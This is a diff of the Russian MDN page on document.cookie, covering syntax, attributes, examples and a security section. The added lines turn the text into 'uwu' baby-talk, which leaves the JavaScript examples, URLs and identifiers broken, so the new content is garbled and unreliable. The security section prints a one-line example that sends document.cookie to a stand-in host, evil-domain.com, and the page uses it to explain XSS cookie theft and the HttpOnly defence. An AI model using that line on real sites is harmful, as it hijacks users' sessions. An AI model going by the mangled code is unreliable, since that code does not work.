@@ -1,370 +1,370 @@
 ---
-title: Document.cookie
-slug: Web/API/Document/cookie
+titwe: document.cookie
+swug: w-web/api/document/cookie
 ---
 
-{{APIRef("DOM")}}
+{{apiwef("dom")}}
 
-Статья описывает получение и установку cookies связанных с текущим документом. Общая библиотека для работы с cookies смотри [simple cookie framework](/ru/docs/Web/API/Document/cookie/Simple_document.cookie_framework).
+Статья описывает получение и установку c-cookies связанных с текущим документом. Общая библиотека для работы с c-cookies смотри [simpwe c-cookie fwamewowk](/wu/docs/web/api/document/cookie/simpwe_document.cookie_fwamewowk). ^^;;
 
 ## Синтаксис
 
-### Чтение всех cookies, связанных с текущим документом
+### Чтение всех c-cookies, ʘwʘ связанных с текущим документом
 
 ```
-allCookies = document.cookie;
+a-awwcookies = document.cookie;
 ```
 
-In the code above _allCookies_ is a string containing a semicolon-separated list of all cookies (i.e. `key=value` pairs). Note that each _key_ and _value_ may be surrounded by whitespace (space and tab characters): in fact [RFC 6265](https://tools.ietf.org/html/rfc6265) mandates a single space after each semicolon, but some user agents may not abide by this.
+i-in the code above _awwcookies_ i-is a stwing containing a semicowon-sepawated wist of aww cookies (i.e. σωσ `key=vawue` paiws). ^^;; nyote that each _key_ a-and _vawue_ may be suwwounded by whitespace (space a-and tab chawactews): in fact [wfc 6265](https://toows.ietf.owg/htmw/wfc6265) m-mandates a singwe space aftew each semicowon, ʘwʘ but some usew agents m-may nyot abide by this. ^^
 
-### Запись новой cookie
+### Запись новой c-cookie
 
 ```
-document.cookie = newCookie;
+d-document.cookie = nyewcookie;
 ```
 
-В приведённом коде `newCookie` - строка в виде `key=value`_._ Заметьте, у вас есть возможность установить/обновить лишь одну связку `key=value` за один раз, используя этот метод. Стоит отметить, что:
+В приведённом коде `newcookie` - строка в виде `key=vawue`_._ Заметьте, nyaa~~ у вас есть возможность установить/обновить лишь одну связку `key=vawue` за один раз, (///ˬ///✿) используя этот метод. XD Стоит отметить, :3 что:
 
-- Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:
+- any of the fowwowing cookie attwibute vawues c-can optionawwy fowwow the key-vawue paiw, òωó specifying the cookie to set/update, a-and pweceded by a semi-cowon sepawatow:
 
-  - `;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.
+  - `;path=path` (e.g., '`/`', ^^ '`/mydiw`') i-if nyot specified, ^•ﻌ•^ d-defauwts t-to the cuwwent p-path of the cuwwent document wocation.
 
-    > [!NOTE]
-    > Prior to Gecko 6.0, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.
+    > [!note]
+    > pwiow t-to gecko 6.0, σωσ paths with quotes wewe tweated a-as if the quotes wewe pawt of the stwing, (ˆ ﻌ ˆ)♡ instead of as if they wewe dewimitews suwwounding the a-actuaw path stwing. nyaa~~ this has been f-fixed. ʘwʘ
 
-    The path must be **absolute** (see [RFC 6265](https://tools.ietf.org/html/rfc6265)). For more information on how to use relative paths, see [this paragraph](#Using_relative_URLs_in_the_path_parameter).
+    the p-path must be **absowute** (see [wfc 6265](https://toows.ietf.owg/htmw/wfc6265)). ^•ﻌ•^ f-fow mowe infowmation on how to use wewative paths, rawr x3 see [this p-pawagwaph](#using_wewative_uwws_in_the_path_pawametew). 🥺
 
-  - `;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
-  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` or 31536000 for a year)
-  - `;expires=date-in-GMTString-format` If neither `expires` nor `max-age`specified it will expire at the end of session.
+  - `;domain=domain` (e.g., '`exampwe.com`' o-ow '`subdomain.exampwe.com`'). ʘwʘ if nyot specified, (˘ω˘) t-this defauwts t-to the host powtion of the c-cuwwent document wocation. o.O contwawy t-to eawwiew specifications, σωσ weading dots in domain nyames awe i-ignowed, (ꈍᴗꈍ) but bwowsews may decwine t-to set the cookie containing s-such dots. (ˆ ﻌ ˆ)♡ if a d-domain is specified, o.O subdomains awe awways incwuded. :3
+  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` ow 31536000 fow a yeaw)
+  - `;expiwes=date-in-gmtstwing-fowmat` if nyeithew `expiwes` n-nyow `max-age`specified i-it wiww expiwe at the e-end of session. -.-
 
-    > [!WARNING]
-    > When user privacy is a concern, It is important that any web app implementation will invalidate cookie data after a certain timeout and won't rely on the browser clearing session cookies
-    > One of the most beloved features of Firefox [prevents session cookies from ever expiring](https://bugzilla.mozilla.org/show_bug.cgi?id=345345).
-    > The same [issue](https://code.google.com/p/chromium/issues/detail?id=128513) is also occuring with google chrome (and probably with other browsers offering similar features)
+    > [!wawning]
+    > w-when usew p-pwivacy is a concewn, ( ͡o ω ͡o ) it is impowtant that any web app impwementation w-wiww invawidate cookie data aftew a cewtain timeout and won't wewy on the b-bwowsew cweawing session cookies
+    > o-one of t-the most bewuvd f-featuwes of fiwefox [pwevents session cookies fwom e-evew expiwing](https://bugziwwa.moziwwa.owg/show_bug.cgi?id=345345). /(^•ω•^)
+    > the s-same [issue](https://code.googwe.com/p/chwomium/issues/detaiw?id=128513) i-is awso o-occuwing with googwe chwome (and pwobabwy with o-othew bwowsews o-offewing simiwaw f-featuwes)
 
-    - See {{jsxref("Date.toUTCString()")}} for help formatting this value.
+    - s-see {{jsxwef("date.toutcstwing()")}} f-fow hewp fowmatting this vawue. (⑅˘꒳˘)
 
-  - `;secure` Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.
-  - `;samesite` [SameSite](/ru/docs/Web/HTTP/Guides/Cookies#samesite_cookies) prevents the browser from sending this cookie along with cross-site requests. Possible values for the flag are `lax` or `strict`.
+  - `;secuwe` cookie to o-onwy be twansmitted ovew secuwe pwotocow as https. òωó befowe chwome 52, 🥺 this fwag couwd appeaw with c-cookies fwom http domains.
+  - `;samesite` [samesite](/wu/docs/web/http/guides/cookies#samesite_cookies) pwevents the bwowsew f-fwom sending this c-cookie awong w-with cwoss-site wequests. (ˆ ﻌ ˆ)♡ possibwe v-vawues fow the fwag awe `wax` o-ow `stwict`. -.-
 
-    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link.
-    - The `lax` value will only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks.
+    - t-the `stwict` vawue wiww pwevent the cookie fwom being sent by the bwowsew to the tawget site i-in aww cwoss-site bwowsing context, σωσ e-even when fowwowing a weguwaw w-wink. >_<
+    - t-the `wax` vawue wiww onwy send cookies fow top wevew n-nyavigation g-get wequests. :3 this is sufficient f-fow usew twacking, OwO b-but it wiww pwevent many cswf attacks. rawr
 
-- The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
-- Some user agent implementations support the following cookie prefixes:
+- the cookie vawue stwing can use {{jsxwef("gwobaw_objects/encodeuwicomponent", (///ˬ///✿) "encodeuwicomponent()")}} t-to ensuwe t-that the stwing d-does nyot contain any commas, ^^ semicowons, o-ow whitespace (which a-awe disawwowed in cookie vawues). XD
+- s-some usew agent impwementations suppowt the fowwowing cookie pwefixes:
 
-  - `__Secure-` Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
-  - `__Host-` Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.
+  - `__secuwe-` s-signaws t-to the bwowsew that it shouwd onwy incwude the c-cookie in wequests t-twansmitted ovew a secuwe channew. UwU
+  - `__host-` signaws to t-the bwowsew that in addition to the westwiction to onwy use the cookie fwom a s-secuwe owigin, o.O the scope of the cookie is wimited t-to a path attwibute p-passed down by the sewvew. 😳 if the sewvew omits the path attwibute t-the "diwectowy" o-of the wequest uwi is used. (˘ω˘) it awso signaws that the domain a-attwibute must nyot be pwesent, 🥺 w-which pwevents the cookie fwom being sent to othew domains. ^^ f-fow chwome the path attwibute must a-awways be the o-owigin. >w<
 
-  > [!NOTE]
-  > The dash is considered part of the prefix.
+  > [!note]
+  > the dash i-is considewed pawt of the pwefix. ^^;;
 
-  > [!NOTE]
-  > These flags are only setable with the `secure` attribute.
+  > [!note]
+  > t-these fwags a-awe onwy setabwe w-with the `secuwe` attwibute.
 
-> [!NOTE]
-> As you can see from the code above, `document.cookie` is an [accessor property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with native _setter_ and _getter_ functions, and consequently is **not** a [data property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.
+> [!note]
+> a-as y-you can see fwom the code above, (˘ω˘) `document.cookie` is an [accessow p-pwopewty](/wu/docs/web/javascwipt/wefewence/gwobaw_objects/object/definepwopewty#descwiption) w-with nyative _settew_ a-and _gettew_ functions, OwO and consequentwy i-is **not** a [data pwopewty](/wu/docs/web/javascwipt/wefewence/gwobaw_objects/object/definepwopewty#descwiption) w-with a vawue: nyani y-you wwite is nyot the same as nyani you wead, (ꈍᴗꈍ) evewything is a-awways mediated b-by the javascwipt i-intewpwetew. òωó
 
 ## Примеры
 
 ### Пример #1: Простое использование
 
 ```js
-document.cookie = "name=oeschger";
-document.cookie = "favorite_food=tripe";
-function alertCookie() {
-  alert(document.cookie);
+d-document.cookie = "name=oeschgew";
+document.cookie = "favowite_food=twipe";
+f-function awewtcookie() {
+  awewt(document.cookie);
 }
 ```
 
-```html
-<button onclick="alertCookie()">Show cookies</button>
+```htmw
+<button oncwick="awewtcookie()">show cookies</button>
 ```
 
-{{EmbedLiveSample('Пример_1_Простое_использование', 200, 36)}}
+{{embedwivesampwe('Пример_1_Простое_использование', ʘwʘ 200, 36)}}
 
 ### Пример #2: Получить cookie с именем _test2_
 
 ```js
-document.cookie = "test1=Hello";
-document.cookie = "test2=World";
+document.cookie = "test1=hewwo";
+d-document.cookie = "test2=wowwd";
 
-var cookieValue = document.cookie.replace(
-  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/,
+vaw c-cookievawue = document.cookie.wepwace(
+  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, ʘwʘ
   "$1",
 );
 
-function alertCookieValue() {
-  alert(cookieValue);
+function awewtcookievawue() {
+  a-awewt(cookievawue);
 }
 ```
 
-```html
-<button onclick="alertCookieValue()">Show cookie value</button>
+```htmw
+<button oncwick="awewtcookievawue()">show c-cookie vawue</button>
 ```
 
-{{EmbedLiveSample('Пример_2_Получить_cookie_с_именем_test2', 200, 36)}}
+{{embedwivesampwe('Пример_2_Получить_cookie_с_именем_test2', nyaa~~ 200, 36)}}
 
 ### Пример #3: Выполнить операцию единожды
 
-При использовании следующего кода замените все вхождения `doSomethingOnlyOnce` (наименование cookie) на другое имя.
+При использовании следующего кода замените все вхождения `dosomethingonwyonce` (наименование cookie) на другое имя. UwU
 
 ```js
-function doOnce() {
-  if (
-    document.cookie.replace(
-      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
-      "$1",
-    ) !== "true"
+f-function d-doonce() {
+  i-if (
+    document.cookie.wepwace(
+      /(?:(?:^|.*;\s*)dosomethingonwyonce\s*\=\s*([^;]*).*$)|^.*$/, (⑅˘꒳˘)
+      "$1", (˘ω˘)
+    ) !== "twue"
   ) {
-    alert("Do something here!");
+    a-awewt("do s-something hewe!");
     document.cookie =
-      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+      "dosomethingonwyonce=twue; expiwes=fwi, :3 31 dec 9999 23:59:59 gmt";
   }
 }
 ```
 
-```html
-<button onclick="doOnce()">Only do something once</button>
+```htmw
+<button oncwick="doonce()">onwy do something o-once</button>
 ```
 
-{{EmbedLiveSample('Пример_3_Выполнить_операцию_единожды', 200, 36)}}
+{{embedwivesampwe('Пример_3_Выполнить_операцию_единожды', (˘ω˘) 200, 36)}}
 
-### Пример #4: Перезагрузить cookie
+### Пример #4: Перезагрузить c-cookie
 
 ```js
-function resetOnce() {
+function w-wesetonce() {
   document.cookie =
-    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+    "dosomethingonwyonce=; e-expiwes=thu, nyaa~~ 01 jan 1970 00:00:00 gmt";
 }
 ```
 
-```html
-<button onclick="resetOnce()">Reset only once cookie</button>
+```htmw
+<button oncwick="wesetonce()">weset o-onwy once cookie</button>
 ```
 
-{{EmbedLiveSample('Пример_4_Перезагрузить_cookie', 200, 36)}}
+{{embedwivesampwe('Пример_4_Перезагрузить_cookie', (U ﹏ U) 200, 36)}}
 
-### Example #5: Проверить существование cookie
+### e-exampwe #5: Проверить существование cookie
 
 ```
-//ES5
+//es5
 
-if (document.cookie.split(';').filter(function(item) {
-    return item.trim().indexOf('reader=') == 0
-}).length) {
-    console.log('The cookie "reader" exists (ES5)')
+if (document.cookie.spwit(';').fiwtew(function(item) {
+    w-wetuwn item.twim().indexof('weadew=') == 0
+}).wength) {
+    consowe.wog('the c-cookie "weadew" e-exists (es5)')
 }
 
-//ES2016
+//es2016
 
-if (document.cookie.split(';').filter((item) => item.trim().startsWith('reader=')).length) {
-    console.log('The cookie "reader" exists (ES6)')
+if (document.cookie.spwit(';').fiwtew((item) => i-item.twim().stawtswith('weadew=')).wength) {
+    c-consowe.wog('the cookie "weadew" exists (es6)')
 }
 ```
 
-### Example #6: Проверить, что cookie имеет определённое значение
+### exampwe #6: Проверить, nyaa~~ что cookie имеет определённое значение
 
 ```
-//ES5
+//es5
 
-if (document.cookie.split(';').filter(function(item) {
-    return item.indexOf('reader=1') >= 0
-}).length) {
-    console.log('The cookie "reader" has "1" for value')
+i-if (document.cookie.spwit(';').fiwtew(function(item) {
+    w-wetuwn i-item.indexof('weadew=1') >= 0
+}).wength) {
+    c-consowe.wog('the c-cookie "weadew" has "1" fow vawue')
 }
 
-//ES2016
+//es2016
 
-if (document.cookie.split(';').filter((item) => item.includes('reader=1')).length) {
-    console.log('The cookie "reader" has "1" for value')
+i-if (document.cookie.spwit(';').fiwtew((item) => i-item.incwudes('weadew=1')).wength) {
+    consowe.wog('the c-cookie "weadew" h-has "1" fow vawue')
 }
 ```
 
 ## Безопасность
 
-It is important to note that the path attribute does **not** protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden [iframe](/ru/docs/Web/HTML/Element/iframe) element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/ru/docs/Web/Security/Same-origin_policy).
+i-it is impowtant to nyote that the path attwibute d-does **not** pwotect against u-unauthowized w-weading of the cookie fwom a diffewent p-path. ^^;; it can be easiwy bypassed using the d-dom, OwO fow exampwe b-by cweating a h-hidden [ifwame](/wu/docs/web/htmw/ewement/ifwame) ewement with the path of the cookie, nyaa~~ then accessing t-this ifwame's `contentdocument.cookie` pwopewty. UwU the onwy w-way to pwotect t-the cookie is by using a diffewent d-domain ow subdomain, 😳 due to the [same o-owigin p-powicy](/wu/docs/web/secuwity/same-owigin_powicy). 😳
 
-Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -
+cookies awe often used in web a-appwication to identify a usew and theiw authenticated s-session. (ˆ ﻌ ˆ)♡ s-so steawing cookie fwom a web a-appwication, (✿oωo) wiww wead to hijacking t-the authenticated u-usew's session. nyaa~~ c-common ways to steaw cookies incwude using sociaw engineewing ow by expwoiting an xss vuwnewabiwity in the appwication -
 
 ```js
-new Image().src =
-  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+nyew image().swc =
+  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + document.cookie;
 ```
 
-The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
+the httponwy cookie attwibute can hewp t-to mitigate this a-attack by pweventing access to cookie vawue thwough j-javascwipt. ^^ w-wead mowe about [cookies a-and secuwity](https://www.nczonwine.net/bwog/2009/05/12/cookies-and-secuwity/). (///ˬ///✿)
 
 ## Примечания
 
-- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](/ru/docs/Web/API/Web_Storage_API).
-- You can delete a cookie by simply updating its expiration time to zero.
-- Keep in mind that the more you have cookies the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use [WHATWG DOM Storage](/ru/docs/Web/API/Web_Storage_API) if you are going to keep "client-only" data.
-- [RFC 2965](https://www.ietf.org/rfc/rfc2965.txt) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.
+- stawting with f-fiwefox 2, 😳 a bettew mechanism f-fow cwient-side s-stowage is avaiwabwe - [naniwg dom stowage](/wu/docs/web/api/web_stowage_api). òωó
+- y-you can dewete a cookie by simpwy u-updating its e-expiwation time to zewo. ^^;;
+- keep in mind that the m-mowe you have c-cookies the mowe d-data wiww be twansfewwed b-between t-the sewvew and t-the cwient fow e-each wequest. rawr this w-wiww make each w-wequest swowew. (ˆ ﻌ ˆ)♡ it is highwy w-wecommended fow y-you to use [naniwg d-dom stowage](/wu/docs/web/api/web_stowage_api) if you awe going t-to keep "cwient-onwy" data. XD
+- [wfc 2965](https://www.ietf.owg/wfc/wfc2965.txt) (section 5.3, >_< "impwementation wimits") specifies t-that thewe shouwd be **no maximum w-wength** of a-a cookie's key o-ow vawue size, (˘ω˘) and encouwages impwementations t-to suppowt **awbitwawiwy w-wawge cookies**. 😳 each bwowsew's i-impwementation maximum wiww n-nyecessawiwy be diffewent, o.O so consuwt individuaw bwowsew documentation. (ꈍᴗꈍ)
 
-The reason of the [syntax](#syntax) of the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](/ru/docs/Web/API/Web_Storage_API)):
+the w-weason of the [syntax](#syntax) of the `document.cookie` a-accessow p-pwopewty is due to the cwient-sewvew nyatuwe of cookies, rawr x3 which d-diffews fwom othew cwient-cwient s-stowage methods (wike, ^^ f-fow instance, OwO [wocawstowage](/wu/docs/web/api/web_stowage_api)):
 
-##### The server tells the client to store a cookie
-
-```
-HTTP/1.0 200 OK
-Content-type: text/html
-Set-Cookie: cookie_name1=cookie_value1
-Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
-
-[content of the page here]
-```
-
-##### The client sends back to the server its cookies previously stored
+##### t-the sewvew tewws the cwient to stowe a cookie
 
 ```
-GET /sample_page.html HTTP/1.1
-Host: www.example.org
-Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
-Accept: */*
+h-http/1.0 200 o-ok
+content-type: text/htmw
+set-cookie: c-cookie_name1=cookie_vawue1
+set-cookie: cookie_name2=cookie_vawue2; expiwes=sun, ^^ 16 j-juw 3567 06:23:41 gmt
+
+[content o-of the p-page hewe]
 ```
 
-### Использование относительных ссылок в параметре path
+##### t-the cwient sends back to t-the sewvew its c-cookies pweviouswy s-stowed
 
-The [`path`](#new-cookie_path) parameter of a new cookie can accept only _absolute_ paths. If you want to use _relative_ paths, therefore, you need to convert them. The following function can translate _relative_ paths to _absolute_ paths. It is a general-purpose function, but can be of course successifully used for the [`path`](#new-cookie_path) parameter of a new cookie, as well.
+```
+get /sampwe_page.htmw h-http/1.1
+host: www.exampwe.owg
+c-cookie: cookie_name1=cookie_vawue1; c-cookie_name2=cookie_vawue2
+a-accept: */*
+```
 
-##### Library
+### Использование относительных ссылок в параметре p-path
+
+the [`path`](#new-cookie_path) p-pawametew o-of a nyew cookie c-can accept onwy _absowute_ p-paths. :3 if you want to u-use _wewative_ paths, o.O thewefowe, -.- y-you nyeed to convewt them. (U ﹏ U) the f-fowwowing function c-can twanswate _wewative_ p-paths to _absowute_ paths. o.O it is a genewaw-puwpose f-function, OwO but can b-be of couwse s-successifuwwy used fow the [`path`](#new-cookie_path) pawametew of a nyew cookie, ^•ﻌ•^ a-as weww.
+
+##### w-wibwawy
 
 ```js
 /*\
 |*|
-|*|  :: Translate relative paths to absolute paths ::
+|*|  :: twanswate wewative p-paths to absowute p-paths ::
 |*|
-|*|  https://developer.mozilla.org/ru/docs/Web/API/document.cookie
-|*|  https://developer.mozilla.org/User:fusionchess
+|*|  https://devewopew.moziwwa.owg/wu/docs/web/api/document.cookie
+|*|  https://devewopew.moziwwa.owg/usew:fusionchess
 |*|
-|*|  The following code is released under the GNU Public License, version 3 or later.
-|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
+|*|  the fowwowing c-code is weweased u-undew the gnu p-pubwic wicense, v-vewsion 3 ow watew. ʘwʘ
+|*|  http://www.gnu.owg/wicenses/gpw-3.0-standawone.htmw
 |*|
 \*/
 
-function relPathToAbs(sRelPath) {
-  var nUpLn,
-    sDir = "",
-    sPath = location.pathname.replace(
-      /[^\/]*$/,
-      sRelPath.replace(/(\/|^)(?:\.?\/+)+/g, "$1"),
+function wewpathtoabs(swewpath) {
+  v-vaw nyupwn, :3
+    s-sdiw = "", 😳
+    spath = wocation.pathname.wepwace(
+      /[^\/]*$/, òωó
+      s-swewpath.wepwace(/(\/|^)(?:\.?\/+)+/g, 🥺 "$1"),
     );
-  for (
-    var nEnd, nStart = 0;
-    (nEnd = sPath.indexOf("/../", nStart)), nEnd > -1;
-    nStart = nEnd + nUpLn
+  fow (
+    vaw nyend, rawr x3 nystawt = 0;
+    (nend = s-spath.indexof("/../", ^•ﻌ•^ nystawt)), :3 n-nend > -1;
+    n-nystawt = nyend + nyupwn
   ) {
-    nUpLn = /^\/(?:\.\.\/)*/.exec(sPath.slice(nEnd))[0].length;
-    sDir = (sDir + sPath.substring(nStart, nEnd)).replace(
-      new RegExp("(?:\\/+[^\\/]*){0," + (nUpLn - 1) / 3 + "}$"),
-      "/",
+    n-nyupwn = /^\/(?:\.\.\/)*/.exec(spath.swice(nend))[0].wength;
+    s-sdiw = (sdiw + spath.substwing(nstawt, (ˆ ﻌ ˆ)♡ n-nyend)).wepwace(
+      nyew wegexp("(?:\\/+[^\\/]*){0," + (nupwn - 1) / 3 + "}$"), (U ᵕ U❁)
+      "/", :3
     );
   }
-  return sDir + sPath.substr(nStart);
+  w-wetuwn s-sdiw + spath.substw(nstawt);
 }
 ```
 
-##### Sample usage
+##### sampwe u-usage
 
 ```js
-/* Let us be in /ru/docs/Web/API/document.cookie */
+/* w-wet us be in /wu/docs/web/api/document.cookie */
 
-alert(location.pathname);
-// displays: /ru/docs/Web/API/document.cookie
+a-awewt(wocation.pathname);
+// d-dispways: /wu/docs/web/api/document.cookie
 
-alert(relPathToAbs("./"));
-// displays: /ru/docs/Web/API/
+a-awewt(wewpathtoabs("./"));
+// dispways: /wu/docs/web/api/
 
-alert(relPathToAbs("../Guide/API/DOM/Storage"));
-// displays: /ru/docs/Web/Guide/API/DOM/Storage
+awewt(wewpathtoabs("../guide/api/dom/stowage"));
+// d-dispways: /wu/docs/web/guide/api/dom/stowage
 
-alert(relPathToAbs("../../Firefox"));
-// displays: /ru/docs/Firefox
+awewt(wewpathtoabs("../../fiwefox"));
+// dispways: /wu/docs/fiwefox
 
-alert(relPathToAbs("../Guide/././API/../../../Firefox"));
-// displays: /ru/docs/Firefox
+a-awewt(wewpathtoabs("../guide/././api/../../../fiwefox"));
+// d-dispways: /wu/docs/fiwefox
 ```
 
-### Относительный срок годности cookie: числовые примеры
+### Относительный срок годности c-cookie: числовые примеры
 
-If you don't want to use an _absolute date_ for the `end` parameter, here you can find some numeric examples of expiration-dates _relative to the moment of storage of the cookie_:
+if you don't want to use an _absowute date_ fow the `end` pawametew, ^^;; h-hewe you can find some nyumewic e-exampwes o-of expiwation-dates _wewative to the moment of stowage o-of the cookie_:
 
 ```js
-docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
-docCookies.setItem("mycookie2", "myvalue2", 6048e2, "/"); // this cookie will expire in one WEEK
-docCookies.setItem("mycookie3", "myvalue3", 2592e3, "/"); // this cookie will expire in one MONTH (30 days)
-docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will expire in one YEAR
+doccookies.setitem("mycookie1", "myvawue1", ( ͡o ω ͡o ) 864e2, o.O "/"); // t-this cookie w-wiww expiwe i-in one day
+doccookies.setitem("mycookie2", ^•ﻌ•^ "myvawue2", XD 6048e2, "/"); // t-this cookie w-wiww expiwe in one week
+doccookies.setitem("mycookie3", ^^ "myvawue3", o.O 2592e3, "/"); // this cookie wiww expiwe in one month (30 d-days)
+doccookies.setitem("mycookie4", ( ͡o ω ͡o ) "myvawue4", /(^•ω•^) 31536e3, "/"); // this cookie w-wiww expiwe in one yeaw
 ```
 
 ## Другие примеры
 
-### Example #5: Do something only once – _a general library_
+### exampwe #5: do something onwy o-once – _a genewaw wibwawy_
 
 #### Библиотека
 
 ```
-function executeOnce () {
-  var argc = arguments.length, bImplGlob = typeof arguments[argc - 1] === "string";
-  if (bImplGlob) { argc++; }
-  if (argc < 3) { throw new TypeError("executeOnce - not enough arguments"); }
-  var fExec = arguments[0], sKey = arguments[argc - 2];
-  if (typeof fExec !== "function") { throw new TypeError("executeOnce - first argument must be a function"); }
-  if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { throw new TypeError("executeOnce - invalid identifier"); }
-  if (decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) === "1") { return false; }
-  fExec.apply(argc > 3 ? arguments[1] : null, argc > 4 ? Array.prototype.slice.call(arguments, 2, argc - 2) : []);
-  document.cookie = encodeURIComponent(sKey) + "=1; expires=Fri, 31 Dec 9999 23:59:59 GMT" + (bImplGlob || !arguments[argc - 1] ? "; path=/" : "");
-  return true;
+function exekawaii~once () {
+  vaw awgc = awguments.wength, 🥺 bimpwgwob = t-typeof awguments[awgc - 1] === "stwing";
+  i-if (bimpwgwob) { awgc++; }
+  i-if (awgc < 3) { thwow nyew typeewwow("exekawaii~once - nyot enough a-awguments"); }
+  v-vaw fexec = awguments[0], nyaa~~ skey = a-awguments[awgc - 2];
+  if (typeof f-fexec !== "function") { thwow nyew typeewwow("exekawaii~once - fiwst awgument must be a function"); }
+  if (!skey || /^(?:expiwes|max\-age|path|domain|secuwe)$/i.test(skey)) { t-thwow nyew typeewwow("exekawaii~once - invawid i-identifiew"); }
+  i-if (decodeuwicomponent(document.cookie.wepwace(new w-wegexp("(?:(?:^|.*;)\\s*" + encodeuwicomponent(skey).wepwace(/[\-\.\+\*]/g, mya "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), XD "$1")) === "1") { wetuwn fawse; }
+  f-fexec.appwy(awgc > 3 ? awguments[1] : nyuww, nyaa~~ awgc > 4 ? awway.pwototype.swice.caww(awguments, ʘwʘ 2, awgc - 2) : []);
+  d-document.cookie = e-encodeuwicomponent(skey) + "=1; e-expiwes=fwi, (⑅˘꒳˘) 31 d-dec 9999 23:59:59 gmt" + (bimpwgwob || !awguments[awgc - 1] ? "; path=/" : "");
+  w-wetuwn t-twue;
 }
 ```
 
 #### Синтаксис
 
 ```
-executeOnce(callback[, thisObject[, argumentToPass1[, argumentToPass2[, …[, argumentToPassN]]]]], identifier[, onlyHere])
+exekawaii~once(cawwback[, :3 thisobject[, -.- a-awgumenttopass1[, 😳😳😳 awgumenttopass2[, (U ﹏ U) …[, awgumenttopassn]]]]], o.O identifiew[, ( ͡o ω ͡o ) o-onwyhewe])
 ```
 
 #### Описание
 
-Executes a function only once, even after the refresh of the page.
+exekawaii~s a function o-onwy once, òωó even a-aftew the wefwesh of the page. 🥺
 
 #### Параметры
 
-- `callback`
-  - : The function to be executed ({{jsxref("function", "", "", 1)}}).
-- `thisObject` Optional
-  - : The {{jsxref("Operators/this", "this")}} object ({{jsxref("Object", "", "", 1)}} or {{jsxref("Global_Objects/null", "null")}}).
-- `argumentToPass1, argumentToPass2, argumentToPassN` Optional
-  - : The arguments of the `callback` function.
-- `identifier`
-  - : The identifier to check, i.e. the name of the cookie ({{jsxref("String", "string", "", 1)}})
-- `onlyHere` Optional
-  - : A {{jsxref("Boolean", "boolean", "", 1)}} expressing whether the cookie will use the local path (`true`) instead of the global one (`false` or `undefined`) ({{jsxref("Boolean", "boolean", "", 1)}} or {{jsxref("Global_Objects/undefined", "undefined")}})
+- `cawwback`
+  - : t-the f-function to be exekawaii~d ({{jsxwef("function", /(^•ω•^) "", "", 1)}}). 😳😳😳
+- `thisobject` optionaw
+  - : t-the {{jsxwef("opewatows/this", ^•ﻌ•^ "this")}} object ({{jsxwef("object", nyaa~~ "", "", 1)}} ow {{jsxwef("gwobaw_objects/nuww", OwO "nuww")}}). ^•ﻌ•^
+- `awgumenttopass1, σωσ awgumenttopass2, -.- a-awgumenttopassn` optionaw
+  - : the awguments o-of the `cawwback` function. (˘ω˘)
+- `identifiew`
